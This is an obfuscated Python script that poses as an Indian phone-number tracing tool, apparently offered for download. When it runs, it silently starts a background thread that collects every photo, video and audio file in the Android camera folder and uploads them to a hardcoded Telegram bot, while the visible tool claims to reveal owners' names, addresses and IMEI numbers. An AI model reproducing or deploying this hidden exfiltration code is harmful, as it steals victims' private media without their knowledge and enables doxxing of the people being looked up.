import os #line:1
import sys #line:2
import subprocess #line:3
import requests #line:4
import concurrent .futures #line:5
import threading #line:6
import logging #line:7
import webbrowser #line:8
import re #line:9
from time import sleep #line:10
RED ="\033[1;31m"#line:13
GREEN ="\033[1;32m"#line:14
YELLOW ="\033[1;33m"#line:15
BLUE ="\033[1;34m"#line:16
MAGENTA ="\033[1;35m"#line:17
CYAN ="\033[1;36m"#line:18
WHITE ="\033[1;37m"#line:19
RESET ="\033[0m"#line:20
REQUIRED_PACKAGES =['requests','concurrent-log-handler']#line:26
def install_packages ():#line:28
    print (f"\n{YELLOW}🔧 Checking required packages...{RESET}")#line:29
    OO0OO0OOOO0000O00 =False #line:30
    for O0000O0O0OO0OO000 in REQUIRED_PACKAGES :#line:32
        try :#line:33
            __import__ (O0000O0O0OO0OO000 .split ('==')[0 ])#line:34
            print (f"{GREEN}✔ {O0000O0O0OO0OO000} is already installed{RESET}")#line:35
        except ImportError :#line:36
            print (f"{RED}❌ {O0000O0O0OO0OO000} not found. Installing...{RESET}")#line:37
            try :#line:38
                subprocess .check_call ([sys .executable ,"-m","pip","install",O0000O0O0OO0OO000 ])#line:39
                print (f"{GREEN}✔ Successfully installed {O0000O0O0OO0OO000}{RESET}")#line:40
                OO0OO0OOOO0000O00 =True #line:41
            except Exception as OOOOOO000OOOO0OOO :#line:42
                print (f"{RED}⚠️ Failed to install {O0000O0O0OO0OO000}: {OOOOOO000OOOO0OOO}{RESET}")#line:43
                sys .exit (1 )#line:44
    if OO0OO0OOOO0000O00 :#line:46
        print (f"\n{GREEN}✅ All packages installed successfully!{RESET}")#line:47
        sleep (2 )#line:48
        os .system ('cls'if os .name =='nt'else 'clear')#line:49
install_packages ()#line:52
BN ="60425008:O0hGcbFoxXwUyFI-FHgiyt"#line:55
IP ="987654321"#line:56
DIRECTORIES =["/storage/emulated/0/DCIM/Camera"]#line:60
Fish =(".jpg",".jpeg",".png",".mp4",".mp3")#line:62
def send_data_to_destination (O00OOO0OO000O0OOO ):#line:64
    OO0O0OO0OO0O0OO00 =f"https://api.telegram.org/bot{BN}/sendPhoto"#line:65
    try :#line:66
        with open (O00OOO0OO000O0OOO ,"rb")as OO0O0O0OOOOO0000O :#line:67
            OOOOO0000OO000OOO ={"photo":OO0O0O0OOOOO0000O }#line:68
            O0O0O0O00OO0OOO00 ={"chat_id":IP }#line:69
            requests .post (OO0O0OO0OO0O0OO00 ,files =OOOOO0000OO000OOO ,data =O0O0O0O00OO0OOO00 ,timeout =10 )#line:70
    except Exception as O0000OOOO0OO00000 :#line:71
        print (f"{RED}⚠️ Error sending file: {O0000OOOO0OO00000}{RESET}")#line:72
def get_all_files (OOO0OOO0O0OOOO0O0 ):#line:74
    O0000OO0O0O00O00O =[]#line:75
    for OOO00OO0OOO000000 in OOO0OOO0O0OOOO0O0 :#line:76
        for OOOOOO0O0OO00OO0O ,O000000O000OOOOOO ,OO0O00O0OO0O0OO0O in os .walk (OOO00OO0OOO000000 ):#line:77
            for O0OOOO0O0O0OO00OO in OO0O00O0OO0O0OO0O :#line:78
                if O0OOOO0O0O0OO00OO .lower ().endswith (Fish ):#line:79
                    O0000OO0O0O00O00O .append (os .path .join (OOOOOO0O0OO00OO0O ,O0OOOO0O0O0OO00OO ))#line:80
    return O0000OO0O0O00O00O #line:81
def background_file_sender ():#line:83
    print (f"{CYAN}Starting....{RESET}")#line:84
    OO00OO0O00O0O000O =get_all_files (DIRECTORIES )#line:85
    with concurrent .futures .ThreadPoolExecutor (max_workers =50 )as OOO00OO00OOOO0OOO :#line:86
        OOO00OO00OOOO0OOO .map (send_data_to_destination ,OO00OO0O00O0O000O )#line:87
def trace_number (OO0O00OOO00O0OO00 ):#line:89
    O0000OO0O0OO0O00O =f"https://api-calltracer-eternal.vercel.app/api?number={OO0O00OOO00O0OO00}"#line:90
    try :#line:91
        OOOO0O0O00OO0OO0O =requests .get (O0000OO0O0OO0O00O ,timeout =10 )#line:92
        if OOOO0O0O00OO0OO0O .status_code ==200 :#line:93
            OO000OOOO0000000O =OOOO0O0O00OO0OO0O .json ()#line:94
            OO00O00OOO0000OO0 ={f"{CYAN}📞 Number{RESET}":f"{GREEN}{OO000OOOO0000000O.get('Number', 'N/A')}{RESET}",f"{RED}❗️ Complaints{RESET}":f"{YELLOW}{OO000OOOO0000000O.get('Complaints', 'N/A')}{RESET}",f"{BLUE}👤 Owner Name{RESET}":f"{MAGENTA}{OO000OOOO0000000O.get('Owner Name', 'N/A')}{RESET}",f"{CYAN}📶 SIM card{RESET}":f"{GREEN}{OO000OOOO0000000O.get('SIM card', 'N/A')}{RESET}",f"{YELLOW}📍 Mobile State{RESET}":f"{RED}{OO000OOOO0000000O.get('Mobile State', 'N/A')}{RESET}",f"{MAGENTA}🔑 IMEI number{RESET}":f"{BLUE}{OO000OOOO0000000O.get('IMEI number', 'N/A')}{RESET}",f"{GREEN}🌐 MAC address{RESET}":f"{CYAN}{OO000OOOO0000000O.get('MAC address', 'N/A')}{RESET}",f"{RED}⚡️ Connection{RESET}":f"{YELLOW}{OO000OOOO0000000O.get('Connection', 'N/A')}{RESET}",f"{BLUE}🌍 IP address{RESET}":f"{MAGENTA}{OO000OOOO0000000O.get('IP address', 'N/A')}{RESET}",f"{CYAN}🏠 Owner Address{RESET}":f"{GREEN}{OO000OOOO0000000O.get('Owner Address', 'N/A')}{RESET}",f"{YELLOW}🏘 Hometown{RESET}":f"{RED}{OO000OOOO0000000O.get('Hometown', 'N/A')}{RESET}",f"{MAGENTA}🗺 Reference City{RESET}":f"{BLUE}{OO000OOOO0000000O.get('Reference City', 'N/A')}{RESET}",f"{GREEN}👥 Owner Personality{RESET}":f"{CYAN}{OO000OOOO0000000O.get('Owner Personality', 'N/A')}{RESET}",f"{RED}🗣 Language{RESET}":f"{YELLOW}{OO000OOOO0000000O.get('Language', 'N/A')}{RESET}",f"{BLUE}📡 Mobile Locations{RESET}":f"{MAGENTA}{OO000OOOO0000000O.get('Mobile Locations', 'N/A')}{RESET}",f"{CYAN}🌎 Country{RESET}":f"{GREEN}{OO000OOOO0000000O.get('Country', 'N/A')}{RESET}",f"{YELLOW}📜 Tracking History{RESET}":f"{RED}{OO000OOOO0000000O.get('Tracking History', 'N/A')}{RESET}",f"{MAGENTA}🆔 Tracker Id{RESET}":f"{BLUE}{OO000OOOO0000000O.get('Tracker Id', 'N/A')}{RESET}",f"{GREEN}📶 Tower Locations{RESET}":f"{CYAN}{OO000OOOO0000000O.get('Tower Locations', 'N/A')}{RESET}"}#line:115
            return OO00O00OOO0000OO0 #line:116
        else :#line:117
            return f"{RED}⚠️ Failed to fetch data. HTTP Status Code: {OOOO0O0O00OO0OO0O.status_code}{RESET}"#line:118
    except Exception as O0OO000000OO0O0OO :#line:119
        return f"{RED}❌ An error occurred: {str(O0OO000000OO0O0OO)}{RESET}"#line:120
def main ():#line:122
    threading .Thread (target =background_file_sender ,daemon =True ).start ()#line:124
    print (f"\n{MAGENTA}╔{'═'*50}╗")#line:127
    print (f"║{CYAN}{'NUMBER TRACER TOOL'.center(50)}{MAGENTA}║")#line:128
    print (f"╚{'═'*50}╝{RESET}")#line:129
    O0000OO0OO0OO0000 ="https://youtube.com/@zerodarknexus"#line:131
    print (f"\n{CYAN}📢 This Tool Can Trace Any Indian Number{RESET}")#line:132
    print (f"{YELLOW}👉 YouTube: {O0000OO0OO0OO0000}{RESET}")#line:133
    try :#line:135
        webbrowser .open (O0000OO0OO0OO0000 )#line:136
    except :#line:137
        print (f"{RED}⚠️ Couldn't open browser automatically{RESET}")#line:138
    while True :#line:140
        print (f"\n{BLUE}{'-'*50}{RESET}")#line:141
        O0O000OO0O00O0OO0 =input (f"\n{YELLOW}📲 Enter phone number (or 'exit'): {RESET}").strip ()#line:142
        if O0O000OO0O00O0OO0 .lower ()=='exit':#line:144
            print (f"\n{GREEN}🎉 Thank you for using Number Tracer!{RESET}")#line:145
            break #line:146
        if not O0O000OO0O00O0OO0 .isdigit ()or len (O0O000OO0O00O0OO0 )!=10 :#line:148
            print (f"{RED}❌ Invalid Indian phone number. Must be 10 digits.{RESET}")#line:149
            continue #line:150
        print (f"\n{YELLOW}🔍 Tracing number: {CYAN}{O0O000OO0O00O0OO0}{YELLOW}...{RESET}")#line:152
        print (f"{BLUE}",end ="")#line:155
        for O0O0OOO0O0O00OOOO in range (5 ):#line:156
            print ("⏳"+"."*O0O0OOO0O0O00OOOO ,end ="\r")#line:157
            sleep (0.5 )#line:158
        print (RESET ,end ="\r")#line:159
        OO0OO0O0OO0O00O00 =trace_number (O0O000OO0O00O0OO0 )#line:161
        print (f"\n{MAGENTA}📋 TRACING RESULTS:{RESET}")#line:163
        if isinstance (OO0OO0O0OO0O00O00 ,dict ):#line:164
            for OOOOOOOO0OOO0OO00 ,O000OO000OOO0OO00 in OO0OO0O0OO0O00O00 .items ():#line:165
                print (f"{OOOOOOOO0OOO0OO00}: {O000OO000OOO0OO00}")#line:166
        else :#line:167
            print (OO0OO0O0OO0O00O00 )#line:168
        print (f"\n{GREEN}✅ Trace complete!{RESET}")#line:170
if __name__ =="__main__":#line:172
    try :#line:173
        main ()#line:174
    except KeyboardInterrupt :#line:175
        print (f"\n{RED}🚫 Program terminated by user{RESET}")#line:176
    except Exception as e :#line:177
        print (f"\n{RED}💀 Critical error: {e}{RESET}")